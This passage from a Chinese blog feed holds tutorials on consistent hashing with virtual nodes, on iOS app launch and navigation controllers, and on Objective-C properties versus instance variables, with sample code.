                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-05%20%E4%B8%8B%E5%8D%889.45.18.png" alt="屏幕快照 2017-07-05 下午9.45.18.png" title="" class="">
                <p>屏幕快照 2017-07-05 下午9.45.18.png</p>
            </figure>
<p>这个时候如果嫌桶的数量少了，对3取模，结果就变成了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-05%20%E4%B8%8B%E5%8D%889.46.51.png" alt="屏幕快照 2017-07-05 下午9.46.51.png" title="" class="">
                <p>屏幕快照 2017-07-05 下午9.46.51.png</p>
            </figure>
<p>可以看到新加了一个桶后所有数字的分布都变了，这就意味着哈希表的每次扩展和收缩都会导致所有条目分布的重新计算，这种情况在cache服务器的文件分配上就是不可接受的了。</p>
<p>所以我们需要采用非一致性哈希算法,，一致性哈希中假想我们有很多个桶，先定一个小目标比如 7 个，但一开始真实还是只有两个桶，编号是 3 和 6。哈希算法还是同样的取模，只不过现在分桶分到的很可能是不存在的桶，那么就往下找找到第一个真实存在的桶放进去。这样 2 和 3 都被分到了编号为 3 的桶， 4 和 5 被分到了编号为 6 的桶。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-05%20%E4%B8%8B%E5%8D%889.49.00.png" alt="屏幕快照 2017-07-05 下午9.49.00.png" title="" class="">
                <p>屏幕快照 2017-07-05 下午9.49.00.png</p>
            </figure>
<p>这时候再添加一个新的桶，编号是 4，取模方法不变还是模 7：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-05%20%E4%B8%8B%E5%8D%889.49.22.png" alt="屏幕快照 2017-07-05 下午9.49.22.png" title="" class="">
                <p>屏幕快照 2017-07-05 下午9.49.22.png</p>
            </figure>
<p>因为 3 号桶里都是取模小于等于 3 的，4 号桶只需要从 6 号桶里拿走属于它的数字就可以了，这种情况下只需要调整一个桶的数字就可分成了重新分布。可以想象下即使有 1 亿个桶，增加减少一个桶也只会影响一个桶的数据分布。</p>
<p>这样增加一个机器只需要和他后面的机器同步一下数据就可以开始工作了，下线一个机器需要先把他的数据同步到后面一台机器再下线。如果突然掉了一台机器也只会影响这台机器上的数据。实现中可以让每台机器同步一份自己前面机器的数据，这样即使掉线也不会影响这一部分的数据服务。</p>
<p>这里还有个小问题要是编号为 6 的机桶下线了，它没有后一个桶了，数据该咋办？为了解决这个问题，实现上通常把哈希空间做成环状，这样 3 就成了 6 的下一桶，数据给 3 就好了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-05%20%E4%B8%8B%E5%8D%889.52.24.png" alt="屏幕快照 2017-07-05 下午9.52.24.png" title="" class="">
                <p>屏幕快照 2017-07-05 下午9.52.24.png</p>
            </figure>
<p>应用到我们的缓存服务器当中，这种算法就是非常合适的，将cache作为桶，object作为数字，避免了大量的数据迁移，减少了服务器的压力。但是受限于cache服务器的数量（桶的数量），无法满足平衡性，所有又引入了虚拟节点：虚拟节点”（ virtual node ）是实际节点（机器）在 hash 空间的复制品，一个实际节点（机器）对应了若干个“虚拟节点”，这个对应个数也成为“复制个数”，“虚拟节点”在 hash 空间中以hash值排列。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-05%20%E4%B8%8B%E5%8D%8810.04.30.png" alt="屏幕快照 2017-07-05 下午10.04.30.png" title="" class="">
                <p>屏幕快照 2017-07-05 下午10.04.30.png</p>
            </figure>
<p>这样也就满足了平衡性了，可以广泛的进行应用。</p>
]]></content>
      
        <categories>
            
            <category> 一致性和非一致性hash 分布式 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 服务器端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI 启动原理和导航控制器]]></title>
      <url>/2017/08/13/iOS-UI-%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E5%92%8C%E5%AF%BC%E8%88%AA%E6%8E%A7%E5%88%B6%E5%99%A8/</url>
      <content type="html"><![CDATA[<p>关于应用程序的启动原理，你是不是真的了解了呢？<br><a id="more"></a></p>
<h2 id="应用程序启动原理"><a href="#应用程序启动原理" class="headerlink" title="应用程序启动原理"></a>应用程序启动原理</h2><h3 id="应用程序对象（UIApplication）"><a href="#应用程序对象（UIApplication）" class="headerlink" title="应用程序对象（UIApplication）"></a>应用程序对象（UIApplication）</h3><blockquote>
<p>对象的作用：</p>
<p>1.属性：保存一些值</p>
<p>2.方法：可以执行的功能</p>
<p>sharedApplication 返回应用程序的单例对象</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">UIApplication *app1 = [UIApplication sharedApplication];</div><div class="line">UIApplication *app2 = [UIApplication sharedApplication];</div><div class="line">//打印出来了两者的内存地址是相同的</div><div class="line">NSLog(@&quot;%@,%@&quot;, app1 ,app1);</div></pre></td></tr></table></figure>
<blockquote>
<p>openURL 可以打电话，还可以发邮件，以及应用之间的跳转</p>
<p>keywindow:应用程序的主窗口</p>
<p>networkActivityIndicatorVisible:网络连接</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//联网指示器</div><div class="line">app1.networkAcivityIndicatorVisible = !app1.networkActivityIndicatorVisible;</div></pre></td></tr></table></figure>
<blockquote>
<p>applicationSupportsShakeToEdit:摇晃设备恢复/取消键入</p>
<p>applicationIconBadgeNumber:应用头像上的数字</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// ios8以后，在设置数字之前，应用必须注册</div><div class="line">app1.applicationIconBadgeBumber = 10;</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/79342A85460003AF1C1F44E569F8796E.jpg" alt="79342A85460003AF1C1F44E569F8796E.jpg" title="" class="">
                <p>79342A85460003AF1C1F44E569F8796E.jpg</p>
            </figure>
<blockquote>
<p>判断手机系统的版本</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[UIDevice currentDevice].systemVersion doubleValue];</div></pre></td></tr></table></figure>
<blockquote>
<p>状态栏的隐藏</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//ios9以后不建议使用下面这种方式</div><div class="line">- （BOOL）prefersStatusBarHidden&#123;</div><div class="line">  return YES;</div><div class="line">&#125;</div><div class="line">//建议使用后下面这种</div><div class="line">app1.statusBarHidden = YES;</div></pre></td></tr></table></figure>
<h3 id="应用程序代理对象"><a href="#应用程序代理对象" class="headerlink" title="应用程序代理对象"></a>应用程序代理对象</h3><blockquote>
<p>AppDelegate类型的对象</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#pragma mark - 应用程序加载完成</div><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line">    return YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line">#pragma mark - 即将非活跃状态（即将失去焦点）</div><div class="line">- (void)applicationWillResignActive:(UIApplication *)application &#123;</div><div class="line"> </div><div class="line">&#125;</div><div class="line"></div><div class="line">#pragma mark - 应用程序进入后台</div><div class="line">- (void)applicationDidEnterBackground:(UIApplication *)application &#123;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">#pragma mark - 即将进入前台</div><div class="line">- (void)applicationWillEnterForeground:(UIApplication *)application &#123;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">#pragma mark - 成为活跃状态（获取焦点）可以让用户操作</div><div class="line">- (void)applicationDidBecomeActive:(UIApplication *)application &#123;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">#pragma mark - 应用即将被销毁时</div><div class="line">- (void)applicationWillTerminate:(UIApplication *)application &#123;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>启动：<br>&gt;</p>
<blockquote>
<p>应用加载完成</p>
<p>成为活跃状态（获取焦点）可以让用户操作</p>
</blockquote>
<p>进入后台：<br>&gt;</p>
<blockquote>
<p>即将非活跃状态</p>
<p>应用程序进入后台</p>
</blockquote>
<p>进入前台：<br>&gt;</p>
<blockquote>
<p>即将进入前台</p>
<p>成为活跃状态（获取焦点）可以让用户操作</p>
</blockquote>
<p>直接销毁的操作：<br>&gt;</p>
<blockquote>
<p>即将非活跃状态</p>
<p>应用程序进入后台</p>
<p>即将被销毁时调用</p>
</blockquote>
<p>先进入后台再销毁：<br>&gt;</p>
<blockquote>
<p>即将非活跃状态</p>
<p>应用程序进入后台</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/011084494EB3A0BDFFD530CD149F75ED.jpg" alt="011084494EB3A0BDFFD530CD149F75ED.jpg" title="" class="">
                <p>011084494EB3A0BDFFD530CD149F75ED.jpg</p>
            </figure>
</blockquote>
<h3 id="应用程序启动过程"><a href="#应用程序启动过程" class="headerlink" title="应用程序启动过程"></a>应用程序启动过程</h3><p>1.程序启动先执行main.m中的main函数</p>
<p>2.在main函数内部根据第三个参数,创建UIApplication对象</p>
<p>3.根据第四个参数</p>
<blockquote>
<p>创建AppDelegate类</p>
<p>然后再去创建AppDelegate对象</p>
<p>将AppDelegate对象赋值给应用程序对象的代理属性，作为代理</p>
</blockquote>
<p>4.有了应用程序和应用代理对象，再创建一个窗口（就是AppDelegate 中的window）作为应用程序的主窗口</p>
<p>5.应用程序根据配置的信息去加载默认的storyboard文件里面的控制器</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/442199927B054B99C62C2660FF77A51A.jpg" alt="442199927B054B99C62C2660FF77A51A.jpg" title="" class="">
                <p>442199927B054B99C62C2660FF77A51A.jpg</p>
            </figure>
<h2 id="加载自定义控制器"><a href="#加载自定义控制器" class="headerlink" title="加载自定义控制器"></a>加载自定义控制器</h2><h3 id="加载自定义控制器-1"><a href="#加载自定义控制器-1" class="headerlink" title="加载自定义控制器"></a>加载自定义控制器</h3><blockquote>
<p>1.将系统提供的viewController.h/.m和main.storyboard删除</p>
<p>2.在应用加载完毕方法内实现加载自定义控制器</p>
<blockquote>
<p>自定义控制器，继承自系统的UIViewController</p>
<p>1.先创建一个窗口</p>
<p>2.设定窗口的根控制器为自定义控制器</p>
<p>3.将这个窗口作为主窗口显示并显示</p>
</blockquote>
</blockquote>
<h3 id="控制器的View是懒加载的"><a href="#控制器的View是懒加载的" class="headerlink" title="控制器的View是懒加载的"></a>控制器的View是懒加载的</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//在第一次使用控制器的view的时候会加载</div><div class="line">- (void)loadView&#123;</div><div class="line">  [super loadView];</div><div class="line">&#125;</div><div class="line">//在上面这个方法执行完成之后才会有view，才能对view进行设置</div></pre></td></tr></table></figure>
<h3 id="控制器的3种创建方式"><a href="#控制器的3种创建方式" class="headerlink" title="控制器的3种创建方式"></a>控制器的3种创建方式</h3><blockquote>
<p>纯代码的方式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//首先要将项目中将main作为主界面的选项清空</div><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line">    // Override point for customization after application launch.</div><div class="line">    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];</div><div class="line">    //设置窗口的根控制器为自定义控制器</div><div class="line">    PController *customVc = [[PController alloc] init];</div><div class="line">    self.window.rootViewController = customVc;</div><div class="line">    </div><div class="line">    //将窗口作为主窗口显示</div><div class="line">    [self.window makeKeyAndVisible];</div><div class="line"></div><div class="line">    return YES;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>通过storyboard的方式创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line">     // Override point for customization after application launch.</div><div class="line">     self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];</div><div class="line">     //设置窗口的根控制器为自定义控制器</div><div class="line">     //先加载storyboard文件</div><div class="line">     UIStoryboard *sb = [UIStoryboard storyboardWithName:@&quot;Pzp&quot; bundle:nil];</div><div class="line">   	//这是在设置storyboard的时候将其作为initialController</div><div class="line">     UIViewController *sbVc = [sb instantiateInitialViewController];</div><div class="line">     //也可以使用重用标识符</div><div class="line">   UIViewController *sbVc = [sb instantiateViewControllerWithIdentifier:@&quot;sb&quot;];</div><div class="line">     self.window.rootViewController = sbVc;</div><div class="line">     </div><div class="line">     [self.window makeKeyAndVisible];</div><div class="line">     return YES;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>通过xib创建控制器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line"> /**</div><div class="line">  1.在创建控制器的时候直接指定要加载的xib作为控制器的view，名称不相干</div><div class="line">     &gt; 需要修改xib文件的fileowner(共同操作)</div><div class="line">     &gt; 需要将fileowner中的view指向xib里面的view(共同操作，拖线)</div><div class="line">  2.xib文件的名称和控制器相似但是不同名</div><div class="line">  3.xib文件的名称与控制器的名称同名</div><div class="line"> */</div><div class="line">     </div><div class="line">     //创建窗口</div><div class="line">     //brightness 可以调节屏幕的亮度</div><div class="line">     self.window = [[UIWindow alloc] initWithFrame:[UIScreen</div><div class="line">                                                    mainScreen].bounds];</div><div class="line">     //第一种</div><div class="line">     PController *xibVc = [[PController alloc] initWithNibName:@&quot;Pzp.xib&quot; bundle:nil];</div><div class="line">     //第二种</div><div class="line">     PController *xibVc2 = [[PController alloc] init];</div><div class="line">     //第三种</div><div class="line">     PController *xibVc3 = [[PController alloc] init];</div><div class="line">     //设置窗口的根控制器</div><div class="line">     self.window.rootViewController = xibVc;</div><div class="line">     //让窗口作为主窗口并可见</div><div class="line">     [self.window makeKeyAndVisible];</div><div class="line">     return YES;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="导航控制器"><a href="#导航控制器" class="headerlink" title="导航控制器"></a>导航控制器</h2><p>UINavigationController的基本使用</p>
<ul>
<li>初始化UINavigationController</li>
<li>设置UIWindow的rootViewController为UINavigationController</li>
<li>将第一个视图控制器设置为UINavigationController的根视图控制器</li>
<li>通过push方法创建子控制器</li>
<li>通过pop方法可以返回上一控制器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">//导航控制器的基本使用</div><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line">    //创建窗口</div><div class="line">    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];</div><div class="line">    //实例化导航控制器并设置为窗口的根控制器</div><div class="line">    UINavigationController *nav = [[UINavigationController alloc] init];</div><div class="line">    //设置为根控制器</div><div class="line">    self.window.rootViewController = nav;</div><div class="line">    // 创建控制器</div><div class="line">    PzpViewController *redVc = [[PzpViewController alloc] init];</div><div class="line">    </div><div class="line">    Pzp1ViewController *greenVc = [[Pzp1ViewController alloc] init];</div><div class="line">    </div><div class="line">    Pzp2ViewController *blueVc = [[Pzp2ViewController alloc] init];</div><div class="line">    //让控制器显示出来</div><div class="line">    [nav pushViewController:redVc animated:YES];</div><div class="line">    </div><div class="line">    [nav pushViewController:blueVc animated:YES];</div><div class="line">    </div><div class="line">    [nav pushViewController:greenVc animated:YES];</div><div class="line">    </div><div class="line">    [self.window makeKeyAndVisible];</div><div class="line">    </div><div class="line">    return YES;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>导航控制器的常规用法是创建导航控制器的时候就指定一个根控制器，在控制器内制定一些操作的时候，才进行跳转。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/EEEF715C199C210ADB7928DF29FE8E28.jpg" alt="EEEF715C199C210ADB7928DF29FE8E28.jpg" title="" class="">
                <p>EEEF715C199C210ADB7928DF29FE8E28.jpg</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;</div><div class="line">    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];</div><div class="line">    PzpViewController *redVc = [[PzpViewController alloc] init];</div><div class="line">    </div><div class="line">    UINavigationController *nav = [[UINavigationController alloc]           initWithRootViewController:redVc];</div><div class="line">    </div><div class="line">    self.window.rootViewController = nav;</div><div class="line">    </div><div class="line">    [self.window makeKeyAndVisible];</div><div class="line">    </div><div class="line">    return YES;</div><div class="line">&#125;</div><div class="line">//在导航控制器中的根控制器中进栈</div><div class="line">- (IBAction)gotoGreen:(id)sender &#123;</div><div class="line">    Pzp1ViewController *greenViewController = [[Pzp1ViewController alloc] init];</div><div class="line">    [self.navigationController pushViewController:greenViewController animated:YES];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">//在控制器中可以控制出栈</div><div class="line">- (IBAction)back1View&#123;</div><div class="line">  [self.navigationController popViewControllerAnimated:YES];</div><div class="line">&#125;</div><div class="line">- (IBAction)backToRootView&#123;</div><div class="line">  [self.navigationController popToRootViewrollrtAnimated:YES];</div><div class="line">&#125;</div><div class="line">- (IBAction)gotoController	&#123;</div><div class="line">  //从控制器栈的数组中去取</div><div class="line">  UIViewController *greenViewController self.navigationController.viewController[1];</div><div class="line">  </div><div class="line">  [self.navigationController popToViewController:greenViewController animated:YES];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>导航控制器的工作原理</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/D1383975EE218174539E225A16DBE328.jpg" alt="D1383975EE218174539E225A16DBE328.jpg" title="" class="">
                <p>D1383975EE218174539E225A16DBE328.jpg</p>
            </figure>
<p>控制器销毁的顺序：</p>
<p>如果在第三个控制器之中，然后返回根控制器，销毁的顺序是：Two控制器-&gt;Three控制器</p>
<p>因为首先断开的是One控制器指向Two控制器的强指针，所以Two控制器首先被回收。</p>
<h3 id="设置导航栏的内容"><a href="#设置导航栏的内容" class="headerlink" title="设置导航栏的内容"></a>设置导航栏的内容</h3><p>设置导航栏的文字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">self.navigationItem.title = @&quot;hello&quot;;</div></pre></td></tr></table></figure>
<p>设置导航栏左侧的按钮</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//当左侧和右侧按钮相同的时候，跳转回来的时候左侧的会消失</div><div class="line">self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(addClick)];</div><div class="line">//默认是有拖拽返回功能的，如果左侧添加了按钮就没有了</div></pre></td></tr></table></figure>
<h3 id="通过代码跳转后的传值问题："><a href="#通过代码跳转后的传值问题：" class="headerlink" title="通过代码跳转后的传值问题："></a>通过代码跳转后的传值问题：</h3><blockquote>
<p>在红色控制器中，有一个文本框</p>
<p>在跳转到绿色控制器的时候将文本框的内容设置为绿色控制器的标题</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">- (IBAction)gotoGreen:(id)sender &#123;</div><div class="line">    </div><div class="line">    Pzp1ViewController *greenViewController = [[Pzp1ViewController alloc] init];</div><div class="line">    </div><div class="line">    greenViewController.name = self.textField.text;</div><div class="line">    </div><div class="line">    [self.navigationController pushViewController:greenViewController animated:YES];   </div><div class="line">&#125;</div><div class="line">//绿色控制器中</div><div class="line">- (void)setName&#123; </div><div class="line">  _name = name;</div><div class="line">  </div><div class="line">  self.navigationItem.title = name;</div><div class="line">&#125; </div><div class="line">//如果是赋值给其中的一个label,因为view是懒加载的，赋值的时候只有一个控制器，根本就没有label,所以不会显示</div><div class="line">- (void)setName&#123;</div><div class="line">  _name = name;</div><div class="line">  </div><div class="line">  self.lbl.text = name;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="通过storyboard使用导航控制器"><a href="#通过storyboard使用导航控制器" class="headerlink" title="通过storyboard使用导航控制器"></a>通过storyboard使用导航控制器</h3><p>将main.storyboard中的控制器替换为导航控制器，通过控制器连线可以选中根控制器，如果要点击button进行控制器的跳转，也可以通过button连线，选择show。可以用代码改变的在storyboard中修改更方便。</p>
<p>但是要注意的一点是，只有根控制器才有<code>navigation Item</code>,其他的控制器需要手动拖进去。还有一点就是button中没有pop的选项，所以如果要通过button实现pop的话需要和类进行关联实现。 </p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-13%20%E4%B8%8A%E5%8D%889.51.46.png" alt="屏幕快照 2017-08-13 上午9.51.46.png"></p>
<h3 id="通过storyboard传值"><a href="#通过storyboard传值" class="headerlink" title="通过storyboard传值"></a>通过storyboard传值</h3><p>通过控件拖线的方式实现控制器的跳转，不会对按钮的事件进行判断，是无法实现传值的，只能进行基本的跳转操作。</p>
<p>但是通过拖线的方式会调用下面这个方法，可以在这个方法中进行传值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender&#123;</div><div class="line">    //获取目标控制器</div><div class="line">    PController *greenVc = segue.destinationViewController;</div><div class="line">    </div><div class="line">    greenVc.navigationItem.title = self.textField.text;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 多控制器创建方式 传值问题 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS成员变量和属性的关系]]></title>
      <url>/2017/06/26/iOS%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E5%92%8C%E5%B1%9E%E6%80%A7%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
      <content type="html"><![CDATA[<p>成员变量和属性<br><a id="more"></a></p>
<h1 id="iOS-成员变量和属性的关系"><a href="#iOS-成员变量和属性的关系" class="headerlink" title="iOS 成员变量和属性的关系"></a>iOS 成员变量和属性的关系</h1><p>@property 和@synthesizer在objective-c 1.0中，我们为interface同时声明了属性和底层实例变量，那时，属性是oc语言的一个新的机制，并且要求你必须声明与之对应的实例变量，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">@interface MyViewController :UIViewController</div><div class="line">&#123;</div><div class="line">    UIButton *myButton;</div><div class="line">&#125;</div><div class="line">@property (nonatomic, retain) UIButton *myButton;</div><div class="line">@end</div></pre></td></tr></table></figure>
<p>在objective-c 2.0中，@property它将自动创建一个以下划线开头的实例变量。因此，在这个版本中，我们不再为interface声明实例变量。变成我们常见的形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@interface MyViewController :UIViewController</div><div class="line">@property (nonatomic, retain) UIButton *myButton;</div><div class="line">@end</div></pre></td></tr></table></figure></p>
<p>在MyViewController.m文件中，编译器也会自动的生成一个实例变量_myButton。那么在.m文件中可以直接的使用_myButton实例变量，也可以通过属性self.myButton.都是一样的。注意这里的self.myButton其实是调用的myButton属性的getter/setter方法。这与C++中点的使用是有区别的，C++中的点可以直接访问成员变量(也就是实例变量)。例如在oc的.h文件中有如下代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@interface MyViewController :UIViewController</div><div class="line">&#123;</div><div class="line">    NSString *name;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>.m文件中，self.name 这样的表达式是错误的。xcode会提示你使用-&gt;,改成self-&gt;name就可以了。因为oc中点表达式是表示调用方法，而上面的代码中没有name这个方法。所以在oc中点表达式其实就是调用对象的setter和getter方法的一种快捷方式。你可能还见过这种写法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line"></div><div class="line">@property (nonatomic, strong) UIButton *myButton;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">@synthesize myButton;</div></pre></td></tr></table></figure>
<p>@synthesize 语句只能被用在 @implementation 代码段中，@synthesize的作用就是让编译器为你自动生成setter与getter方法，@synthesize 还有一个作用，可以指定与属性对应的实例变量，例如@synthesize myButton = xxx；那么self.myButton其实是操作的实例变量xxx，而不是_myButton了。如果.m文件中写了@synthesize myButton;那么生成的实例变量就是myButton；如果没写@synthesize myButton;那么生成的实例变量就是_myButton。所以跟以前的用法还是有点细微的区别。</p>
<p>二、类别中的属性property</p>
<p>类与类别中添加的属性要区分开来，因为类别中只能添加方法，不能添加实例变量。经常会在ios的代码中看到在类别中添加属性，这种情况下，是不会自动生成实例变量的。比如在：UINavigationController.h文件中会对UIViewController类进行扩展</p>
